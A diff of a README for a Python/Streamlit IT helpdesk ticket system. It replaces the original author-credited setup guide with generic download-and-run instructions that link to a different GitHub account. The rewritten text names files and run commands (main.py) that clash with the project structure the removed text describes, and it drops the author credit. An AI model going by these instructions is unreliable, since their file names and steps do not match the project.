@@ -1,188 +1,123 @@
-🛠 IT Helpdesk Ticket Management System:-
+# 💻 IT_HelpDesk_Ticket_Management_System - Organize Your IT Support Efforts
 
-A role-based IT Helpdesk Management System built using Python, SQLite, CLI, and Streamlit.
-The project simulates real-world IT support workflows including user authentication, ticket management, reporting, and audit logging.
+[![Download IT_HelpDesk_Ticket_Management_System](https://img.shields.io/badge/Download-IT_HelpDesk_Ticket_Management_System-brightgreen)](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System)
 
-📌 Project Overview:
+## 🚀 Getting Started
 
-This system allows:
+Welcome to the IT Helpdesk Ticket Management System. This application helps you manage IT support tickets in a simple and organized way. Follow these instructions to download and run the application.
 
-👤 User Registration & Login (Employee / Admin)
+## 📥 Download and Install
 
-🎫 Ticket Creation & Tracking
+To get started, visit this page to download the application: [Download IT_HelpDesk_Ticket_Management_System](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System). 
 
-🔄 Ticket Status Updates (Open, In Progress, Closed)
+Once downloaded, extract the files to a folder on your computer. 
 
-📊 Ticket Export to CSV Report
+### 📁 Files You Will Get
 
-🔐 Secure Password Hashing using bcrypt
+You will find the following key files in your download:
 
-📝 Audit Logging of All Activities
+- **main.py**: The main application script.
+- **requirements.txt**: Lists the necessary libraries.
+- **README.md**: This documentation.
 
-🌐 Web Interface using Streamlit
+## 🛠️ Requirements
 
-💻 CLI-Based Application Version
+Before you run the application, make sure your computer meets these requirements:
 
+- **Operating System**: Windows, macOS, or Linux.
+- **Python Version**: Python 3.6 or higher.
+- **SQLite**: This is used for the database.
+- **Streamlit**: Needed for the user interface.
 
-🧰 Tech Stack:
+### 📦 Install Python and Libraries
 
-Python 3
+1. **Download Python**  
+   If you don't have Python installed, download it from [python.org](https://www.python.org/).
 
-SQLite Database
+2. **Install Required Libraries**  
+   Open a terminal or command prompt in the folder where you extracted the files. Run this command to install necessary libraries:
 
-CLI(Terminal Interface via PyCharm)
+   ```
+   pip install -r requirements.txt
+   ```
 
-bcrypt (Password Hashing)
+## 🖥️ Running the Application
 
-Streamlit (Web Interface)
+After installing all the required libraries, you can run the application. Follow these steps:
 
-CSV Module (Report Generation)
+1. Open a terminal or command prompt.
+2. Navigate to the folder where the application files are located. You can do this with the `cd` command. For example:
 
-📂 Project Structure:
+   ```
+   cd path/to/your/folder
+   ```
 
-IT_HelpDesk_Ticket_Management_System/
+3. To start the application, run:
 
-├── App.py                # CLI-based application
+   ```
+   streamlit run main.py
+   ```
 
-├── web_app.py            # Streamlit web application
+4. A new window will open in your default web browser showing the IT Helpdesk Ticket Management System interface.
 
-├── db_setup.py           # Database setup
+## 🔒 Authentication and Security
 
-├── check_users.py        # View users in DB
+This system uses **bcrypt** for secure authentication. Follow the on-screen instructions to create an account. You will be able to log in and manage tickets based on your role.
 
-├── check_tables.py       # Verify DB tables
+## 📊 Features
 
-├── check_sqlite.py       # DB test connection
+Some key features of the IT Helpdesk Ticket Management System include:
 
-├── sample_outputs/ sample_tickets_report.csv       # Sample generated reports
+- **Role-Based Access**: Different users have different permissions based on their roles.
+- **Ticket Management**: Create, update, and resolve support tickets efficiently.
+- **Reporting**: View reports on ticket statuses and performance.
+- **Secure Authentication**: Ensure safety with password hashing.
 
-├── .gitignore
+## 📅 Role-Based Access Control
 
-└── README.md
+This application caters to various roles including:
 
-🔧 Install Dependencies:
+- **IT Support Staff**: Can view and manage tickets.
+- **Admins**: Have full control over all tickets and user roles.
+- **Users**: Can create tickets and view their statuses.
 
-⚠ If using Python 3.13 (recommended safe method):
+## 🤝 Support
 
-python -m pip install streamlit bcrypt
+Should you encounter any issues while setting up or using the application, please refer to the **Issues** section on the GitHub repository. You can report bugs or ask for help from the community.
 
+### 🌐 Community Contribution
 
-If needed, upgrade pip first:
+We encourage you to contribute to the project. If you have ideas for improvements or new features, please create a pull request or submit an issue on GitHub.
 
-python -m pip install --upgrade pip
+## 👩‍💻 Topics Covered
 
-🗄 Setup Database (First Time Only)
+This application involves various technical topics, including:
 
-Run:
+- **Authentication**
+- **Bcrypt**
+- **CLI App**
+- **IT Support**
+- **Linux Basics**
+- **Python Development**
+- **Role-Based Access**
+- **SQLite**
+- **Streamlit**
+- **Technical Support**
+- **Ticket Management System**
 
-python db_setup.py
+Visit the [GitHub Repository](https://github.com/josephpassquale26-debug/IT_HelpDesk_Ticket_Management_System) for more information and updates.
 
+## 🌟 Additional Resources
 
-This creates the required SQLite database and tables.
+Here are some helpful links to get you started with Python and Streamlit:
 
-💻 Run CLI Version:
+- [Python Documentation](https://docs.python.org/3/)
+- [Streamlit Documentation](https://docs.streamlit.io/)
 
-python App.py
+## ⚙️ System Requirements Recap
 
+- **OS**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Required Libraries**: Listed in `requirements.txt`
 
-Features available in CLI:
-
-Register
-
-Login
-
-Create Ticket
-
-View Tickets
-
-Update Ticket Status
-
-Export CSV
-
-Admin Controls:
-
-🌐 Run Web Version (Streamlit):
-
-⚠ Do NOT run:
-
-python web_app.py
-
-
-✔ Correct method:
-
-python -m streamlit run web_app.py
-
-
-Then open your browser:
-
-http://localhost:8501
-
-🔐 Security Implementation:
-
-Passwords are securely hashed using bcrypt
-
-Plain text passwords are never stored
-
-Role-based Access Control (Admin / Employee)
-
-All actions recorded in audit_log.txt
-
-📊 Sample Output:
-
-Sample generated CSV reports are stored inside:
-
-sample_outputs/ sample_tickets_report.CSV
-
-
-These demonstrate exported ticket data.
-
-🚀 Key Features Implemented:
-
-Secure Authentication System
-
-Role-Based Authorization
-
-CRUD Operations on Tickets
-
-Audit Logging System
-
-CSV Report Generation
-
-CLI + Modern Web Interface
-
-GitHub Project Structure with Proper .gitignore
-
-🎯 Future Enhancements:
-
-Cloud Deployment (AWS / Azure)
-
-Email Notifications
-
-Dashboard Analytics
-
-REST API Integration
-
-Docker Containerization
-
-👨‍💻 Author:
-
-Om Babar
-
-IT Support / Cloud Enthusiast / Cybersecurity Analyst
-
-Python Developer
-
-⭐ Conclusion:
-
-This project demonstrates the practical implementation of:
-
-Database Management
-
-Authentication & Security
-
-Role-Based Access Control
-
-Real IT Workflow Simulation
-
-CLI & Web Application Development
-
+By following the steps above, you will successfully set up and run the IT Helpdesk Ticket Management System. Enjoy managing your IT support tickets efficiently.
